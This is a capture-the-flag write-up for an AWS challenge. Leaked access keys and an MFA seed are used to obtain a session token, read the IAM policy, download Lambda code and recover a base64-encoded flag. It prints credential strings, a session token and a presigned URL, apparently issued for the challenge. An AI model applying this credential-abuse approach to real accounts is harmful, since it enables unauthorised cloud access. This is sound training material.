# Challenge

So many options to make sure everything stays as it is. Let's use them all.

# Solution

We are presented with two files:

- exposed-user-credentials.txt
- policy-exposed-user.json

The first file contains some credentials which after googling a bit correspond to these respective categories:

```
AWS Access Key ID: AKIA22D7J5LEAGT3CKGP
AWS Secret Access Key: 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
Mfa Device Hardware Token: E3HGFFMHZDLJG2WAEO5FOLMB3GGVVKQNOAIIQ5TIBVBZ4G773RPB47QVC3QTZSJV
Mfa Serial Key: arn:aws:iam::743296330440:mfa/mfa-exposed-user
```

First of all we configure the aws user with the command 
```
aws configure --profile mfa-exposed-user
```

In order to be able to access aws with user mfa-exposed-user, we need a session token. For that a token code is needed. Fortunately, using the mfa hardware token we can
generate TOTP keys using the website

The command to get a session token is the following: [https://www.token2.com/site/page/totp-toolset](https://www.token2.com/site/page/totp-toolset)
```
 aws sts get-session-token --serial-number 'arn:aws:iam::743296330440:mfa/mfa-exposed-user' --token-code <TOTP_CODE> --profile mfa-exposed-user
```

Which returns us some credentials and a session-token.
We can now create the user mfa by adding the following lines in the credentials file

```
[mfa]
aws_access_key_id = ASIA22D7J5LEHSZ5MO6Y
aws_secret_access_key = Cb9QbakPmXIW86kgM0r30fRXcGyY7veOWWk3KkVB
aws_session_token = FwoGZXIvYXdzEMT//////////wEaDFb1WHkN6LX18wD35SKGAbVCK40Ux8/HguSIcusRpnhNmPC0QKd7iE5Whzp6+E7aLgT4OVHLAMGOEI0DSj9kH5Sur+Ohr08SD4MU0jEhRg088S3W7kQ76s+lCNWdIafus3WaY5V2tm+sw4PuGCh4HKDieaNsEWRVvkZhD7iZGUXjIp2d5iskcBNpRZJA1o2zxUDrAzOjKIStqqAGMigEX+xgyWIragX5Zl3LSm6o1fbsHKiYGXyeXcZC7sbIs4wZ5sxntaZq
```
Ok so now we can review the user policy:

```JSON
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "lambda:GetLayerVersion",
                "lambda:GetFunction",
                "lambda:GetLayerVersionPolicy"
            ],
            "Resource": "*",
            "Condition": {
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "lambda:UpdateFunctionCode",
                "lambda:InvokeFunction"
            ],
            "Resource": "arn:aws:lambda:eu-central-1:743296330440:function:lambda-confirm-secret",
            "Condition": {
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        }
    ]
}
```

As we can see, we can invoke GetFunction on every function we know but we only know of arn:aws:lambda:eu-central-1:743296330440:function:lambda-confirm-secret. Notice the eu-central-1 part
which we will need to set as region in order to be able to access the resource.

By calling:

```
aws lambda get-function --function-name lambda-confirm-secret --profile mfa
```

we get the output:

```JSON
{
    "Configuration": {
        "FunctionName": "lambda-confirm-secret",
        "FunctionArn": "arn:aws:lambda:eu-central-1:743296330440:function:lambda-confirm-secret",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::743296330440:role/role-for-lambda-to-read-secret-flag1",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 693,
        "Description": "lambda function that checks the current secret value. Both, the lambda code and the secret are protected against editing by lambda-aws-config-confirm-state-of-lambda and lambda-aws-config-confirm-state-of-secrets ",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-03-09T10:15:31.000+0000",
        "CodeSha256": "XGBROzVr7sFwZJp0F79dvHfNRc6X2Ag3OTbVx9qldOU=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "8e79f5f4-5d22-4cd2-ac78-68ee9e3d983a",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-eu-cent-1-tasks.s3.eu-central-1.amazonaws.com/snapshots/743296330440/lambda-confirm-secret-7170c6e6-2458-4c26-ab03-e66b8fce0d13?versionId=soyBu3Egz3QRUS0WAeGl0LPT1T7ezKD8&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDGV1LWNlbnRyYWwtMSJGMEQCICS347V9%2BXEAa5pz%2BdoBPR5%2FTYdQa2IEiGrhZCu%2ByI3iAiB8FH%2BMGJpuEBfIXwjiXRY6UmpV2zUeDXDF2462eOprGSq7BQheEAMaDDY4MDY4NjU1OTQzNCIMKMLZq2uWj8bt5j25KpgF6AAx3b4wb5um00V1%2BnINkWdA4B1qXZR%2FIsY0OxOVkWvlg2j2Ku%2Fc1OXkle7oVpjjU0HTKW%2FnVlmmZGzfFUzkpjpgKE01MEjLja2NWIklJYIJ5idrKLkiJOxgBlEMhLGbM%2BRRrJeudiBolQFe4u4VBsOAUAjKkJ%2Bgw5PB4R2MqDW1DPASh1R1QwZt1dWNwr34TMInKaDAurcjTZ6AWEvDPl8DtGVzYUn26OagxilfdrUGzjHJitgkG7GrZwRNm8xmIoqSu6IQ4zZest683adyeK1L2AC3%2FTtfAtqb9AyaG41nv8XwKKt%2FUD1ii1WpF5WuXjQ%2FiiztF8TeAXKCr7oa3QXZuE8bMNooqziJvVmyytx8AJgKEmO8iiTJJq%2BFGnMW3jiVrzc95bUxURzvfoO1RZjQIdu0ShmwkIMer844qh%2BxTM%2F0CH2KdgzgO5xxlAkZ9YjZ8jvGJ2Txxqb093F%2FrvtfJxwz9uYfTNCFsoEMqTRtyHUhFwSf1XJp%2BuWOH9%2FhhXDH64JH%2F%2FLhzvk%2FMDObT1GNZDghC007mFVJwUmAk0vvb8h7FMQJzf8OwJTm34T0sygKYmFavLRKWq8LaD9orpjGiVam8PLrr9ahjK0FyOnyCMb6I4A3WcR1CZZ7Vn%2BYUnUu8ov4EVLdgRJq%2FPPg7E6GGN6OhaeQVUAGTBUKFMl%2B6m0W6EfTeDytdFgy%2FoJwCf2utdY9KlWbNarZQcUZPyFFZqMWkHgCWkllQZ8%2BZMtxCb2Rv0aqqtgXNd0i%2FAZBOgYLtf4iEmOhYKisjAMuG6WuNdO0XeYnkyk%2FLGJCjnTNQKQPNHpMCpN66gSmoucWVLo2e%2BFDCjBjVc5rFdbj4cOvCimA1cYyTTKZM1369v%2FxTCv1vUF3JjDso6egBjqyAY744zxDPwiwtsU2loSo85nMH7CSwY%2FcUa4%2BqFhjJhzvnGmpVU4mk%2BdYxD2bpHCm%2FvxAx%2FJVQYobEnvIFTCxOk1FaTSxsMCY0JJeJ9aF5Nalrl%2FRqG%2FMLwmtj1GIY5I%2FbFlEqYrpfnya%2FgYqS%2FJwqYlpOYB0mnfVv%2BAMpiglVKor40gKrf2GBxOo2Yx0%2F5pMyDRDt6NcB3pd8w860dLyVjr5pKsY6IAhnNixbrddshAO02w%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20230309T132522Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAZ47AUUDFASSBGY5K%2F20230309%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Signature=a3e2b642c710d932e8d1cc6bbd595e52ae8b62cd1f86ee7704d239591cbf71f0"
    }
}
```

We can and will download the function from the link given, which gives us the following:

 ```Python
 
import json
import hashlib
import boto3
from botocore.exceptions import ClientError
import base64

def lambda_handler(event, context):
    flag = get_secret()
    m = hashlib.sha512()
    m.update(flag.encode('utf-8')) #b"Nobody inspects")
    hash = base64.b64encode(m.digest())
    if hash == b'cBOdVrF/i42uk+zG6hT/f080JYXUl5JuItkOVdQuC2+J7QCxTNo5ivYglOBT3r3p9P6tpwqfSbr2aqqtV1G5gg==':
        message = "[*] Secret value confirmed"
    else:
        message = "[!] WARNING: SECRET VALUE could not be confirmed!"
    
    return {
        'statusCode': 200,
        'body': json.dumps(message)
    }

def get_secret():

    secret_name = "flag1"
    region_name = "eu-central-1"

    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    try:
        get_secret_value_response = client.get_secret_value(
            SecretId=secret_name
        )
    except ClientError as e: 
        raise e

    return get_secret_value_response['SecretString']
    
```

This function seems to hash our input and compare it against a value which unfortunately cannot be reversed.

After a while we noticed that two other functions are named in the description of lambda-confirm-secret

```
Descrption: lambda function that checks the current secret value. Both, the lambda code and the secret are protected against editing by lambda-aws-config-confirm-state-of-lambda and lambda-aws-config-confirm-state-of-secrets
```

The first one is not something special, but the second seems very interesting:

```Python
import json
import hashlib
import boto3
from botocore.exceptions import ClientError
import base64

def lambda_handler(event, context):
    flag = get_secret()
    m = hashlib.sha512()
    m.update(flag.encode('utf-8')) #b"Nobody inspects")
    hash = base64.b64encode(m.digest())
    if hash == b'cBOdVrF/i42uk+zG6hT/f080JYXUl5JuItkOVdQuC2+J7QCxTNo5ivYglOBT3r3p9P6tpwqfSbr2aqqtV1G5gg==':
        message = "[*] Secret value confirmed"
    else:
        message = "[!] Secret has been changed!"
        correct_secret()
    
    return {
        'statusCode': 200,
        'body': json.dumps(message)
    }

def get_secret():

    secret_name = "flag1"
    region_name = "eu-central-1"

    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    try:
        get_secret_value_response = client.get_secret_value(
            SecretId=secret_name
        )
    except ClientError as e: 
        raise e

    return get_secret_value_response['SecretString']

def correct_secret():
    secret_name = "flag1"
    region_name = "eu-central-1"

    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    response = client.put_secret_value(
    SecretId=secret_name,
    SecretString=base64.b64decode('RU5Pe04wX0VkMXRfU3QxbGxfVnVsbn0='))
```

Function correct_secret secret seems to contain in b64 the correct secret which after decoding gives us the flag: ENO{N0_Ed1t_St1ll_Vuln}
